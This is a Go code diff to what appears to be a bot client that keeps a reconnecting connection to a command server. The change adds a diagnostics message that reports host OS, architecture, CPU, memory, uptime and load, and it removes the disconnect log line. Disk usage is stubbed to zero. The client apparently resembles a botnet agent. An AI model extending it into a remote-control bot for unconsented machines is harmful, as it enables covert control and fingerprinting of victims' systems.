@@ -1,12 +1,18 @@
 package main
 
 import (
+	"bufio"
+	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/binary"
 	"fmt"
 	"io"
 	"net"
+	"os"
+	"runtime"
+	"strconv"
+	"strings"
 	"time"
 )
 
@@ -42,6 +48,8 @@ type Bot struct {
 	stopChan chan struct{}
 }
 
+var botStartTime = time.Now()
+
 func NewBot(botID, server string) *Bot {
 	return &Bot{
 		botID:    botID,
@@ -67,7 +75,6 @@ func (b *Bot) Start() {
 			if b.conn != nil {
 				b.conn.Close()
 			}
-			fmt.Println("[bot] disconnected – reconnecting...")
 			time.Sleep(5 * time.Second)
 		}
 	}
@@ -134,6 +141,10 @@ func (b *Bot) handleConnection() error {
 			if err := b.sendHeartbeatResponse(); err != nil {
 				return err
 			}
+		case PacketTypeDiagnostic:
+			if err := b.sendDiagnostics(); err != nil {
+				fmt.Printf("[bot] send diagnostics: %v\n", err)
+			}
 		default:
 			fmt.Printf("[bot] unknown packet type %d\n", packet.Header.Type)
 		}
@@ -182,6 +193,44 @@ func (b *Bot) sendAuthPacket(typ uint8, marker []byte) error {
 
 func (b *Bot) handleCommand(pkt Packet) {
 	fmt.Printf("[bot] received command (%d bytes)\n", len(pkt.Payload))
+}
+
+func (b *Bot) sendDiagnostics() error {
+	payload := make([]byte, 101)
+	offset := 0
+
+	writeFixedString(payload[offset:offset+16], runtime.GOOS)
+	offset += 16
+
+	writeFixedString(payload[offset:offset+8], runtime.GOARCH)
+	offset += 8
+
+	cpuInfo := fmt.Sprintf("%d cores", runtime.NumCPU())
+	writeFixedString(payload[offset:offset+32], cpuInfo)
+	offset += 32
+
+	binary.BigEndian.PutUint64(payload[offset:offset+8], getTotalMemoryMB())
+	offset += 8
+
+	uptimeSeconds := uint64(time.Since(botStartTime).Seconds())
+	binary.BigEndian.PutUint64(payload[offset:offset+8], uptimeSeconds)
+	offset += 8
+
+	binary.BigEndian.PutUint64(payload[offset:offset+8], uint64(time.Now().Unix()))
+	offset += 8
+
+	load1, load5, load15 := getLoadAverages()
+	binary.BigEndian.PutUint32(payload[offset:offset+4], uint32(load1*100))
+	offset += 4
+	binary.BigEndian.PutUint32(payload[offset:offset+4], uint32(load5*100))
+	offset += 4
+	binary.BigEndian.PutUint32(payload[offset:offset+4], uint32(load15*100))
+	offset += 4
+
+	binary.BigEndian.PutUint64(payload[offset:offset+8], getDiskUsageMB())
+
+	pkt := CreatePacket(PacketTypeDiagnostic, payload)
+	return SendPacket(b.conn, pkt)
 }
 
 // ---------- packet layer ----------
@@ -256,6 +305,56 @@ func ReceivePacket(conn net.Conn) (Packet, error) {
 		return Packet{}, fmt.Errorf("checksum mismatch")
 	}
 	return Packet{Header: hdr, Payload: payload}, nil
+}
+
+func writeFixedString(dst []byte, value string) {
+	copy(dst, value)
+	if len(value) < len(dst) {
+		for i := len(value); i < len(dst); i++ {
+			dst[i] = 0
+		}
+	}
+}
+
+func getTotalMemoryMB() uint64 {
+	if data, err := os.ReadFile("/proc/meminfo"); err == nil {
+		scanner := bufio.NewScanner(bytes.NewReader(data))
+		for scanner.Scan() {
+			line := scanner.Text()
+			if strings.HasPrefix(line, "MemTotal:") {
+				fields := strings.Fields(line)
+				if len(fields) >= 2 {
+					if kb, err := strconv.ParseUint(fields[1], 10, 64); err == nil {
+						return kb / 1024
+					}
+				}
+			}
+		}
+	}
+
+	var m runtime.MemStats
+	runtime.ReadMemStats(&m)
+	return m.Sys / (1024 * 1024)
+}
+
+func getLoadAverages() (float64, float64, float64) {
+	if data, err := os.ReadFile("/proc/loadavg"); err == nil {
+		fields := strings.Fields(string(data))
+		if len(fields) >= 3 {
+			if l1, err1 := strconv.ParseFloat(fields[0], 64); err1 == nil {
+				if l5, err2 := strconv.ParseFloat(fields[1], 64); err2 == nil {
+					if l15, err3 := strconv.ParseFloat(fields[2], 64); err3 == nil {
+						return l1, l5, l15
+					}
+				}
+			}
+		}
+	}
+	return 0, 0, 0
+}
+
+func getDiskUsageMB() uint64 {
+	return 0
 }
 
 // ---------- main ----------
